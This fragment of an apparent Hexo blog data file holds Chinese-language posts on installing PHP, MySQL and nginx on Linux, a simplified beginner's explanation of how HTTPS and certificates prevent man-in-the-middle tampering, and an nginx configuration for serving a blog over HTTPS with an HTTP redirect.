&#x2F;usr&#x2F;local&#x2F;php7&#x2F;etc&#x2F;php.ini</span><br><span class=\"line\"></span><br><span class=\"line\">cp &#x2F;root&#x2F;php-7.0.0&#x2F;sapi&#x2F;fpm&#x2F;init.d.php-fpm &#x2F;etc&#x2F;init.d&#x2F;php-fpm</span><br><span class=\"line\"></span><br><span class=\"line\">cp &#x2F;usr&#x2F;local&#x2F;php7&#x2F;etc&#x2F;php-fpm.conf.default &#x2F;usr&#x2F;local&#x2F;php7&#x2F;etc&#x2F;php-fpm.conf</span><br><span class=\"line\"></span><br><span class=\"line\">cp &#x2F;usr&#x2F;local&#x2F;php7&#x2F;etc&#x2F;php-fpm.d&#x2F;www.conf.default &#x2F;usr&#x2F;local&#x2F;php7&#x2F;etc&#x2F;php-fpm.d&#x2F;www.conf</span><br></pre></td></tr></table></figure>\n\n<p>执行php-fpm启动php-fpm</p>\n<h3 id=\"4-安装mysql数据库\"><a href=\"#4-安装mysql数据库\" class=\"headerlink\" title=\"4.安装mysql数据库\"></a>4.安装mysql数据库</h3><p>下载 MySQL Yum Repository</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget http:&#x2F;&#x2F;dev.mysql.com&#x2F;get&#x2F;mysql-community-release-el7-5.noarch.rpm</span><br></pre></td></tr></table></figure>\n\n<p>添加 MySQL Yum Repository</p>\n<p>添加 MySQL Yum Repository 到你的系统 repository 列表中，执行</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum local install mysql-community-release-el7-5.noarch.rpm</span><br><span class=\"line\"></span><br><span class=\"line\">yum install  mysql-community-server</span><br></pre></td></tr></table></figure>\n\n<p>启动mysql</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl start mysqld</span><br></pre></td></tr></table></figure>\n\n<p>设置mysql密码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;usr&#x2F;bin&#x2F;mysqladmin -u root password &#39;passwd&#39;</span><br></pre></td></tr></table></figure>\n"},{"title":"通俗理解HTTPS（1）","date":"2017-11-15T13:31:37.000Z","_content":"### 两类加密算法\n#### 1.对称加密\n对称加密是最快速、最简单的一种加密方式，加密（encryption）与解密（decryption）用的是同样的密钥（secret key）。\n#### 2.非对称加密\n非对称加密，就是使用\b\b公私钥（采用数学方法，具体可查阅先关资料）的原理。**公钥和\b私钥匙最大特点就是，公钥加密后的东西，只能由私钥来\b解密。不能用\b公钥再来解密**。\b  \n### 理解https原理  \n#### 为啥要用httpts，https解决了什么问题  \n假设有这样一种场景，A和B通信需要C来传递，那我们怎么保证C不去篡改A\b\b和B之间的通信信息呢。其实https就是用来解决这么一个问题，防止中间人攻击。中间人攻击通俗点\b讲，就是A和B通信的过程中需要c来传递消息的时候，C对消息做了\b修改，而且A和B还不能察觉。\b那么在这么一个场景中，我们该如何解决这个问题。（思考10分钟)    \n#### 如何保证消息不被C篡改（采用对称机密)   \nA和B通信的过程中，假设A和B采用一个只有自己知道的秘钥的话，那么A和B的消息C就无法修改了。但是通常情况是A和B秘钥事先没有约定好，怎么办？也需要C来传递秘钥，那么C就可以获取A和B的秘钥，那么A和B的消息对于C来说就是透明的，C就可以为所欲为。所以我们发现这个时候还是解决不了问题，除非A和B的秘钥不通过C来传递，事先是知道的。  \n#### 如何保证消息不被C篡改（采用非对称机密)\n对称加密不可以，那我们来研究下非对称加密。A生成了公钥和私钥，他把他的公钥给了B，由于消息是通过C来传递的。因此C也有A的公钥。这个时候A用他的私钥加密信息，这个时候B和C都可以看到消息。但是C是不能修改消息。C不可以解密了消息，然后修改消息，再把消息再用A的公钥加密，传递给B**（公钥加密后的东西，只能由私钥来\b解密，不能用\b公钥再来解密）**。反过来B要发消息给A，C就完全看不到了，只有A可以看到。这个时候，是不是觉得用公钥和私钥就解决了这个问题。  \n其实并没有解决这个问题。   \n假设A和B一开始交换公钥和私钥的时候，A先生成了公私钥，准备把自己的公钥传递给B的时候。C也生成了一份公钥和和私钥。C把自己的公钥给了A。\n这个时候A发消息给B，C拿A的公钥解密，修改数据然后保存。用自己的私钥加密数据，发给B。B拿C的公钥解密。也得到了数据。这个过程中，A和B的数据已经被篡改了。而且没办法察觉出来。  \n#### 怎么保证A和B交换秘钥不被换掉\n假如A和和B交换秘钥的过程中，对秘钥进行加密，保证C不看到就可以么。那么问题似乎陷入了死循环。这个时候。就会有些聪明的人提出了解决方案。假设存在一个人D。这个人把A和B和C都有它的公钥。A可以先把自己的公钥让D用它的私钥加密，然后把密文给自己，自己再把密文A传递给B经由C。这个时候C虽然拿到了A加密后的公钥，但是没办法篡改。但是假设C也把自己的公钥让D加密了的话。C又可以继续修改数据。  \n那么这个时候最大的问题是我们无法知道B拿到的公钥到底是A的还是C的。那么我们怎么解决这个问题呢。A可以先告诉B自己加密后的秘钥的hash值，但是这个值A可以请求D用自己的私钥匙加个密。A把加密后的hash传递给B虽然B和C都可以看到，但是C无法篡改信息。\n#### 全文小总结\nhttps的主要原理可以概括为两点：  \n1.利用公钥和\b私钥匙最大特点就是，公钥加密后的东西，只能由私钥来\b解密。不能用\b公钥再来解密。  \n2.操作系统和浏览器内置些机构（颁发证书的机构）的公钥。\n\n\n\n\n","source":"_posts/2017-11-15.md","raw":"---\ntitle: '通俗理解HTTPS（1）'\ndate: 2017-11-15 21:31:37\ntags: 网络安全\n---\n### 两类加密算法\n#### 1.对称加密\n对称加密是最快速、最简单的一种加密方式，加密（encryption）与解密（decryption）用的是同样的密钥（secret key）。\n#### 2.非对称加密\n非对称加密，就是使用\b\b公私钥（采用数学方法，具体可查阅先关资料）的原理。**公钥和\b私钥匙最大特点就是，公钥加密后的东西，只能由私钥来\b解密。不能用\b公钥再来解密**。\b  \n### 理解https原理  \n#### 为啥要用httpts，https解决了什么问题  \n假设有这样一种场景，A和B通信需要C来传递，那我们怎么保证C不去篡改A\b\b和B之间的通信信息呢。其实https就是用来解决这么一个问题，防止中间人攻击。中间人攻击通俗点\b讲，就是A和B通信的过程中需要c来传递消息的时候，C对消息做了\b修改，而且A和B还不能察觉。\b那么在这么一个场景中，我们该如何解决这个问题。（思考10分钟)    \n#### 如何保证消息不被C篡改（采用对称机密)   \nA和B通信的过程中，假设A和B采用一个只有自己知道的秘钥的话，那么A和B的消息C就无法修改了。但是通常情况是A和B秘钥事先没有约定好，怎么办？也需要C来传递秘钥，那么C就可以获取A和B的秘钥，那么A和B的消息对于C来说就是透明的，C就可以为所欲为。所以我们发现这个时候还是解决不了问题，除非A和B的秘钥不通过C来传递，事先是知道的。  \n#### 如何保证消息不被C篡改（采用非对称机密)\n对称加密不可以，那我们来研究下非对称加密。A生成了公钥和私钥，他把他的公钥给了B，由于消息是通过C来传递的。因此C也有A的公钥。这个时候A用他的私钥加密信息，这个时候B和C都可以看到消息。但是C是不能修改消息。C不可以解密了消息，然后修改消息，再把消息再用A的公钥加密，传递给B**（公钥加密后的东西，只能由私钥来\b解密，不能用\b公钥再来解密）**。反过来B要发消息给A，C就完全看不到了，只有A可以看到。这个时候，是不是觉得用公钥和私钥就解决了这个问题。  \n其实并没有解决这个问题。   \n假设A和B一开始交换公钥和私钥的时候，A先生成了公私钥，准备把自己的公钥传递给B的时候。C也生成了一份公钥和和私钥。C把自己的公钥给了A。\n这个时候A发消息给B，C拿A的公钥解密，修改数据然后保存。用自己的私钥加密数据，发给B。B拿C的公钥解密。也得到了数据。这个过程中，A和B的数据已经被篡改了。而且没办法察觉出来。  \n#### 怎么保证A和B交换秘钥不被换掉\n假如A和和B交换秘钥的过程中，对秘钥进行加密，保证C不看到就可以么。那么问题似乎陷入了死循环。这个时候。就会有些聪明的人提出了解决方案。假设存在一个人D。这个人把A和B和C都有它的公钥。A可以先把自己的公钥让D用它的私钥加密，然后把密文给自己，自己再把密文A传递给B经由C。这个时候C虽然拿到了A加密后的公钥，但是没办法篡改。但是假设C也把自己的公钥让D加密了的话。C又可以继续修改数据。  \n那么这个时候最大的问题是我们无法知道B拿到的公钥到底是A的还是C的。那么我们怎么解决这个问题呢。A可以先告诉B自己加密后的秘钥的hash值，但是这个值A可以请求D用自己的私钥匙加个密。A把加密后的hash传递给B虽然B和C都可以看到，但是C无法篡改信息。\n#### 全文小总结\nhttps的主要原理可以概括为两点：  \n1.利用公钥和\b私钥匙最大特点就是，公钥加密后的东西，只能由私钥来\b解密。不能用\b公钥再来解密。  \n2.操作系统和浏览器内置些机构（颁发证书的机构）的公钥。\n\n\n\n\n","slug":"2017-11-15","published":1,"updated":"2017-11-19T13:37:18.369Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckox55gca0003ak9c1aph9mzc","content":"<h3 id=\"两类加密算法\"><a href=\"#两类加密算法\" class=\"headerlink\" title=\"两类加密算法\"></a>两类加密算法</h3><h4 id=\"1-对称加密\"><a href=\"#1-对称加密\" class=\"headerlink\" title=\"1.对称加密\"></a>1.对称加密</h4><p>对称加密是最快速、最简单的一种加密方式，加密（encryption）与解密（decryption）用的是同样的密钥（secret key）。</p>\n<h4 id=\"2-非对称加密\"><a href=\"#2-非对称加密\" class=\"headerlink\" title=\"2.非对称加密\"></a>2.非对称加密</h4><p>非对称加密，就是使用\b\b公私钥（采用数学方法，具体可查阅先关资料）的原理。<strong>公钥和\b私钥匙最大特点就是，公钥加密后的东西，只能由私钥来\b解密。不能用\b公钥再来解密</strong>。\b  </p>\n<h3 id=\"理解https原理\"><a href=\"#理解https原理\" class=\"headerlink\" title=\"理解https原理\"></a>理解https原理</h3><h4 id=\"为啥要用httpts，https解决了什么问题\"><a href=\"#为啥要用httpts，https解决了什么问题\" class=\"headerlink\" title=\"为啥要用httpts，https解决了什么问题\"></a>为啥要用httpts，https解决了什么问题</h4><p>假设有这样一种场景，A和B通信需要C来传递，那我们怎么保证C不去篡改A\b\b和B之间的通信信息呢。其实https就是用来解决这么一个问题，防止中间人攻击。中间人攻击通俗点\b讲，就是A和B通信的过程中需要c来传递消息的时候，C对消息做了\b修改，而且A和B还不能察觉。\b那么在这么一个场景中，我们该如何解决这个问题。（思考10分钟)    </p>\n<h4 id=\"如何保证消息不被C篡改（采用对称机密\"><a href=\"#如何保证消息不被C篡改（采用对称机密\" class=\"headerlink\" title=\"如何保证消息不被C篡改（采用对称机密)\"></a>如何保证消息不被C篡改（采用对称机密)</h4><p>A和B通信的过程中，假设A和B采用一个只有自己知道的秘钥的话，那么A和B的消息C就无法修改了。但是通常情况是A和B秘钥事先没有约定好，怎么办？也需要C来传递秘钥，那么C就可以获取A和B的秘钥，那么A和B的消息对于C来说就是透明的，C就可以为所欲为。所以我们发现这个时候还是解决不了问题，除非A和B的秘钥不通过C来传递，事先是知道的。  </p>\n<h4 id=\"如何保证消息不被C篡改（采用非对称机密\"><a href=\"#如何保证消息不被C篡改（采用非对称机密\" class=\"headerlink\" title=\"如何保证消息不被C篡改（采用非对称机密)\"></a>如何保证消息不被C篡改（采用非对称机密)</h4><p>对称加密不可以，那我们来研究下非对称加密。A生成了公钥和私钥，他把他的公钥给了B，由于消息是通过C来传递的。因此C也有A的公钥。这个时候A用他的私钥加密信息，这个时候B和C都可以看到消息。但是C是不能修改消息。C不可以解密了消息，然后修改消息，再把消息再用A的公钥加密，传递给B<strong>（公钥加密后的东西，只能由私钥来\b解密，不能用\b公钥再来解密）</strong>。反过来B要发消息给A，C就完全看不到了，只有A可以看到。这个时候，是不是觉得用公钥和私钥就解决了这个问题。<br>其实并没有解决这个问题。<br>假设A和B一开始交换公钥和私钥的时候，A先生成了公私钥，准备把自己的公钥传递给B的时候。C也生成了一份公钥和和私钥。C把自己的公钥给了A。<br>这个时候A发消息给B，C拿A的公钥解密，修改数据然后保存。用自己的私钥加密数据，发给B。B拿C的公钥解密。也得到了数据。这个过程中，A和B的数据已经被篡改了。而且没办法察觉出来。  </p>\n<h4 id=\"怎么保证A和B交换秘钥不被换掉\"><a href=\"#怎么保证A和B交换秘钥不被换掉\" class=\"headerlink\" title=\"怎么保证A和B交换秘钥不被换掉\"></a>怎么保证A和B交换秘钥不被换掉</h4><p>假如A和和B交换秘钥的过程中，对秘钥进行加密，保证C不看到就可以么。那么问题似乎陷入了死循环。这个时候。就会有些聪明的人提出了解决方案。假设存在一个人D。这个人把A和B和C都有它的公钥。A可以先把自己的公钥让D用它的私钥加密，然后把密文给自己，自己再把密文A传递给B经由C。这个时候C虽然拿到了A加密后的公钥，但是没办法篡改。但是假设C也把自己的公钥让D加密了的话。C又可以继续修改数据。<br>那么这个时候最大的问题是我们无法知道B拿到的公钥到底是A的还是C的。那么我们怎么解决这个问题呢。A可以先告诉B自己加密后的秘钥的hash值，但是这个值A可以请求D用自己的私钥匙加个密。A把加密后的hash传递给B虽然B和C都可以看到，但是C无法篡改信息。</p>\n<h4 id=\"全文小总结\"><a href=\"#全文小总结\" class=\"headerlink\" title=\"全文小总结\"></a>全文小总结</h4><p>https的主要原理可以概括为两点：<br>1.利用公钥和\b私钥匙最大特点就是，公钥加密后的东西，只能由私钥来\b解密。不能用\b公钥再来解密。<br>2.操作系统和浏览器内置些机构（颁发证书的机构）的公钥。</p>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"两类加密算法\"><a href=\"#两类加密算法\" class=\"headerlink\" title=\"两类加密算法\"></a>两类加密算法</h3><h4 id=\"1-对称加密\"><a href=\"#1-对称加密\" class=\"headerlink\" title=\"1.对称加密\"></a>1.对称加密</h4><p>对称加密是最快速、最简单的一种加密方式，加密（encryption）与解密（decryption）用的是同样的密钥（secret key）。</p>\n<h4 id=\"2-非对称加密\"><a href=\"#2-非对称加密\" class=\"headerlink\" title=\"2.非对称加密\"></a>2.非对称加密</h4><p>非对称加密，就是使用\b\b公私钥（采用数学方法，具体可查阅先关资料）的原理。<strong>公钥和\b私钥匙最大特点就是，公钥加密后的东西，只能由私钥来\b解密。不能用\b公钥再来解密</strong>。\b  </p>\n<h3 id=\"理解https原理\"><a href=\"#理解https原理\" class=\"headerlink\" title=\"理解https原理\"></a>理解https原理</h3><h4 id=\"为啥要用httpts，https解决了什么问题\"><a href=\"#为啥要用httpts，https解决了什么问题\" class=\"headerlink\" title=\"为啥要用httpts，https解决了什么问题\"></a>为啥要用httpts，https解决了什么问题</h4><p>假设有这样一种场景，A和B通信需要C来传递，那我们怎么保证C不去篡改A\b\b和B之间的通信信息呢。其实https就是用来解决这么一个问题，防止中间人攻击。中间人攻击通俗点\b讲，就是A和B通信的过程中需要c来传递消息的时候，C对消息做了\b修改，而且A和B还不能察觉。\b那么在这么一个场景中，我们该如何解决这个问题。（思考10分钟)    </p>\n<h4 id=\"如何保证消息不被C篡改（采用对称机密\"><a href=\"#如何保证消息不被C篡改（采用对称机密\" class=\"headerlink\" title=\"如何保证消息不被C篡改（采用对称机密)\"></a>如何保证消息不被C篡改（采用对称机密)</h4><p>A和B通信的过程中，假设A和B采用一个只有自己知道的秘钥的话，那么A和B的消息C就无法修改了。但是通常情况是A和B秘钥事先没有约定好，怎么办？也需要C来传递秘钥，那么C就可以获取A和B的秘钥，那么A和B的消息对于C来说就是透明的，C就可以为所欲为。所以我们发现这个时候还是解决不了问题，除非A和B的秘钥不通过C来传递，事先是知道的。  </p>\n<h4 id=\"如何保证消息不被C篡改（采用非对称机密\"><a href=\"#如何保证消息不被C篡改（采用非对称机密\" class=\"headerlink\" title=\"如何保证消息不被C篡改（采用非对称机密)\"></a>如何保证消息不被C篡改（采用非对称机密)</h4><p>对称加密不可以，那我们来研究下非对称加密。A生成了公钥和私钥，他把他的公钥给了B，由于消息是通过C来传递的。因此C也有A的公钥。这个时候A用他的私钥加密信息，这个时候B和C都可以看到消息。但是C是不能修改消息。C不可以解密了消息，然后修改消息，再把消息再用A的公钥加密，传递给B<strong>（公钥加密后的东西，只能由私钥来\b解密，不能用\b公钥再来解密）</strong>。反过来B要发消息给A，C就完全看不到了，只有A可以看到。这个时候，是不是觉得用公钥和私钥就解决了这个问题。<br>其实并没有解决这个问题。<br>假设A和B一开始交换公钥和私钥的时候，A先生成了公私钥，准备把自己的公钥传递给B的时候。C也生成了一份公钥和和私钥。C把自己的公钥给了A。<br>这个时候A发消息给B，C拿A的公钥解密，修改数据然后保存。用自己的私钥加密数据，发给B。B拿C的公钥解密。也得到了数据。这个过程中，A和B的数据已经被篡改了。而且没办法察觉出来。  </p>\n<h4 id=\"怎么保证A和B交换秘钥不被换掉\"><a href=\"#怎么保证A和B交换秘钥不被换掉\" class=\"headerlink\" title=\"怎么保证A和B交换秘钥不被换掉\"></a>怎么保证A和B交换秘钥不被换掉</h4><p>假如A和和B交换秘钥的过程中，对秘钥进行加密，保证C不看到就可以么。那么问题似乎陷入了死循环。这个时候。就会有些聪明的人提出了解决方案。假设存在一个人D。这个人把A和B和C都有它的公钥。A可以先把自己的公钥让D用它的私钥加密，然后把密文给自己，自己再把密文A传递给B经由C。这个时候C虽然拿到了A加密后的公钥，但是没办法篡改。但是假设C也把自己的公钥让D加密了的话。C又可以继续修改数据。<br>那么这个时候最大的问题是我们无法知道B拿到的公钥到底是A的还是C的。那么我们怎么解决这个问题呢。A可以先告诉B自己加密后的秘钥的hash值，但是这个值A可以请求D用自己的私钥匙加个密。A把加密后的hash传递给B虽然B和C都可以看到，但是C无法篡改信息。</p>\n<h4 id=\"全文小总结\"><a href=\"#全文小总结\" class=\"headerlink\" title=\"全文小总结\"></a>全文小总结</h4><p>https的主要原理可以概括为两点：<br>1.利用公钥和\b私钥匙最大特点就是，公钥加密后的东西，只能由私钥来\b解密。不能用\b公钥再来解密。<br>2.操作系统和浏览器内置些机构（颁发证书的机构）的公钥。</p>\n"},{"title":"ubuntu 16.04安装php 7.0 mysql nginx开发环境","date":"2017-04-22T14:20:01.000Z","_content":"### 一.安装nginx\n`apt-get install nginx`\n配置  \n```\nlocation / {\n                # First attempt to serve request as file, then\n                # as directory, then fall back to displaying a 404.\n                #try_files $uri $uri/ =404;\n                try_files $uri $uri/ /index.php?$query_string;\n        }\n```\n### 二.安装php\n```\nsudo apt-get install php7.0-cli php7.0-cgi php7.0-fpm\n```\n修改配置文件（/etc/nginx/sites-available/default）  \n```\nlocation ~ \\.php$ {\n                include snippets/fastcgi-php.conf;\n                # With php7.0-cgi alone:\n                #fastcgi_pass 127.0.0.1:9000;\n                # With php7.0-fpm:\n                fastcgi_pass unix:/run/php/php7.0-fpm.sock;\n        }\n```\n### 三.安装mysql\n```\napt-get install mysql-server\n输入密码\nsudo apt-get install php7.0-mysql\n```","source":"_posts/2017-4-22.md","raw":"---\ntitle: ubuntu 16.04安装php 7.0 mysql nginx开发环境\ndate: 2017-04-22 22:20:01\ntags: php\n---\n### 一.安装nginx\n`apt-get install nginx`\n配置  \n```\nlocation / {\n                # First attempt to serve request as file, then\n                # as directory, then fall back to displaying a 404.\n                #try_files $uri $uri/ =404;\n                try_files $uri $uri/ /index.php?$query_string;\n        }\n```\n### 二.安装php\n```\nsudo apt-get install php7.0-cli php7.0-cgi php7.0-fpm\n```\n修改配置文件（/etc/nginx/sites-available/default）  \n```\nlocation ~ \\.php$ {\n                include snippets/fastcgi-php.conf;\n                # With php7.0-cgi alone:\n                #fastcgi_pass 127.0.0.1:9000;\n                # With php7.0-fpm:\n                fastcgi_pass unix:/run/php/php7.0-fpm.sock;\n        }\n```\n### 三.安装mysql\n```\napt-get install mysql-server\n输入密码\nsudo apt-get install php7.0-mysql\n```","slug":"2017-4-22","published":1,"updated":"2017-08-15T14:42:47.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckox55gcb0004ak9c4hpjabqr","content":"<h3 id=\"一-安装nginx\"><a href=\"#一-安装nginx\" class=\"headerlink\" title=\"一.安装nginx\"></a>一.安装nginx</h3><p><code>apt-get install nginx</code><br>配置  </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location &#x2F; &#123;</span><br><span class=\"line\">                # First attempt to serve request as file, then</span><br><span class=\"line\">                # as directory, then fall back to displaying a 404.</span><br><span class=\"line\">                #try_files $uri $uri&#x2F; &#x3D;404;</span><br><span class=\"line\">                try_files $uri $uri&#x2F; &#x2F;index.php?$query_string;</span><br><span class=\"line\">        &#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"二-安装php\"><a href=\"#二-安装php\" class=\"headerlink\" title=\"二.安装php\"></a>二.安装php</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install php7.0-cli php7.0-cgi php7.0-fpm</span><br></pre></td></tr></table></figure>\n<p>修改配置文件（/etc/nginx/sites-available/default）  </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location ~ \\.php$ &#123;</span><br><span class=\"line\">                include snippets&#x2F;fastcgi-php.conf;</span><br><span class=\"line\">                # With php7.0-cgi alone:</span><br><span class=\"line\">                #fastcgi_pass 127.0.0.1:9000;</span><br><span class=\"line\">                # With php7.0-fpm:</span><br><span class=\"line\">                fastcgi_pass unix:&#x2F;run&#x2F;php&#x2F;php7.0-fpm.sock;</span><br><span class=\"line\">        &#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"三-安装mysql\"><a href=\"#三-安装mysql\" class=\"headerlink\" title=\"三.安装mysql\"></a>三.安装mysql</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt-get install mysql-server</span><br><span class=\"line\">输入密码</span><br><span class=\"line\">sudo apt-get install php7.0-mysql</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h3 id=\"一-安装nginx\"><a href=\"#一-安装nginx\" class=\"headerlink\" title=\"一.安装nginx\"></a>一.安装nginx</h3><p><code>apt-get install nginx</code><br>配置  </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location &#x2F; &#123;</span><br><span class=\"line\">                # First attempt to serve request as file, then</span><br><span class=\"line\">                # as directory, then fall back to displaying a 404.</span><br><span class=\"line\">                #try_files $uri $uri&#x2F; &#x3D;404;</span><br><span class=\"line\">                try_files $uri $uri&#x2F; &#x2F;index.php?$query_string;</span><br><span class=\"line\">        &#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"二-安装php\"><a href=\"#二-安装php\" class=\"headerlink\" title=\"二.安装php\"></a>二.安装php</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install php7.0-cli php7.0-cgi php7.0-fpm</span><br></pre></td></tr></table></figure>\n<p>修改配置文件（/etc/nginx/sites-available/default）  </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location ~ \\.php$ &#123;</span><br><span class=\"line\">                include snippets&#x2F;fastcgi-php.conf;</span><br><span class=\"line\">                # With php7.0-cgi alone:</span><br><span class=\"line\">                #fastcgi_pass 127.0.0.1:9000;</span><br><span class=\"line\">                # With php7.0-fpm:</span><br><span class=\"line\">                fastcgi_pass unix:&#x2F;run&#x2F;php&#x2F;php7.0-fpm.sock;</span><br><span class=\"line\">        &#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"三-安装mysql\"><a href=\"#三-安装mysql\" class=\"headerlink\" title=\"三.安装mysql\"></a>三.安装mysql</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt-get install mysql-server</span><br><span class=\"line\">输入密码</span><br><span class=\"line\">sudo apt-get install php7.0-mysql</span><br></pre></td></tr></table></figure>"},{"title":"nginx启用https并从http跳转","date":"2017-11-19T13:41:42.000Z","_content":"### 前言 \n网络安全现在变得越来越重要。为了防止我的博客被劫持被运营商强制加弹窗小广告，我还是对博客进行了https升级。同时也能优先我的博客被各大搜索引擎所收录。特此记录下过程，帮助和我有需要的同学快速对博客小站进行http改造。\n### 获取证书\n证书有很多种，具体可以自行了解。对我来说，越便宜越好，能不收钱那是最好的。国内有很多厂商可以支持免费的ssl证书，主要是去支持个人站点。我选用的是腾讯提供的免费的ssl证书。这个是直达链接，复制链接之后按照操作就可以申请到https://cloud.tencent.com/product/ssl            证书了。\n### nginx配置\n我用的是nginx的服务器，所以我只能描述下nginx的配置。我的配置入下，我的这个配置可以支持，http直接跳转到https。下面的配置只需要把自己的证书位置替换之后，重启nginx服务器就可以生效了。  \n\n```\n\n    server {\n        listen  443 ssl;\n        listen 80;\n        ssl on;\n        ssl_certificate \"/etc/crt/1_blog.sleepan.com_bundle.crt\";\n        ssl_certificate_key \"/etc/crt/2_blog.sleepan.com.key\";\n        ssl_session_cache shared:SSL:1m;\n        ssl_session_timeout  10m;\n        ssl_ciphers HIGH:!aNULL:!MD5;\n        ssl_prefer_server_ciphers on;\n        server_name  blog.sleepan.com;\n        root         /var/www/blog;\n        index        index.php index.html index.htm;\n        # Load configuration files for the default server block.\n        include /etc/nginx/default.d/*.conf;\n        if ($scheme = http) {\n          return 301 https://$host$request_uri;\n        }\n\n        location / {\n         try_files $uri $uri/ /index.php?$query_string;\n        }\n\n        error_page 404 /404.html;\n            location = /40x.html {\n        }\n\n        error_page 500 502 503 504 /50x.html;\n          location = /50x.html {\n       }\n        location ~ \\.php$ {\n\n          fastcgi_index   index.php;\n          fastcgi_pass    127.0.0.1:9000;\n          include         fastcgi_params;\n          fastcgi_param   SCRIPT_FILENAME    $document_root$fastcgi_script_name;\n          fastcgi_param   SCRIPT_NAME        $fastcgi_script_name;\n\n       }\n    }\n    \n```\n","source":"_posts/2017-11-19.md","raw":"---\ntitle: nginx启用https并从http跳转\ndate: 2017-11-19 21:41:42\ntags: 网络安全\n---\n### 前言 \n网络安全现在变得越来越重要。为了防止我的博客被劫持被运营商强制加弹窗小广告，我还是对博客进行了https升级。同时也能优先我的博客被各大搜索引擎所收录。特此记录下过程，帮助和我有需要的同学快速对博客小站进行http改造。\n### 获取证书\n证书有很多种，具体可以自行了解。对我来说，越便宜越好，能不收钱那是最好的。国内有很多厂商可以支持免费的ssl证书，主要是去支持个人站点。我选用的是腾讯提供的免费的ssl证书。这个是直达链接，复制链接之后按照操作就可以申请到https://cloud.tencent.com/product/ssl            证书了。\n### nginx配置\n我用的是nginx的服务器，所以我只能描述下nginx的配置。我的配置入下，我的这个配置可以支持，http直接跳转到https。下面的配置只需要把自己的证书位置替换之后，重启nginx服务器就可以生效了。  \n\n```\n\n    server {\n        listen  443 ssl;\n        listen 80;\n        ssl on;\n        ssl_certificate \"/etc/crt/1_blog.sleepan.com_bundle.crt\";\n        ssl_certificate_key \"/etc/crt/2_blog.sleepan.com.key\";\n        ssl_session_cache shared:SSL:1m;\n        ssl_session_timeout  10m;\n        ssl_ciphers HIGH:!aNULL:!MD5;\n        ssl_prefer_server_ciphers on;\n        server_name  blog.sleepan.com;\n        root         /var/www/blog;\n        index        index.php index.html index.htm;\n        # Load configuration files for the default server block.\n        include /etc/nginx/default.d/*.conf;\n        if ($scheme = http) {\n          return 301 https://$host$request_uri;\n        }\n\n        location / {\n         try_files $uri $uri/ /index.php?$query_string;\n        }\n\n        error_page 404 /404.html;\n            location = /40x.html {\n        }\n\n        error_page 500 502 503 504 /50x.html;\n          location = /50x.html {\n       }\n        location ~ \\.php$ {\n\n          fastcgi_index   index.php;\n          fastcgi_pass    127.0.0.1:9000;\n          include         fastcgi_params;\n          fastcgi_param   SCRIPT_FILENAME    $document_root$fastcgi_script_name;\n          fastcgi_param   SCRIPT_NAME        $fastcgi_script_name;\n\n       }\n    }\n    \n```\n","slug":"2017-11-19","published":1,"updated":"2017-11-19T14:00:48.559Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckox55gcc0005ak9cgq5t5mk3","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>网络安全现在变得越来越重要。为了防止我的博客被劫持被运营商强制加弹窗小广告，我还是对博客进行了https升级。同时也能优先我的博客被各大搜索引擎所收录。特此记录下过程，帮助和我有需要的同学快速对博客小站进行http改造。</p>\n<h3 id=\"获取证书\"><a href=\"#获取证书\" class=\"headerlink\" 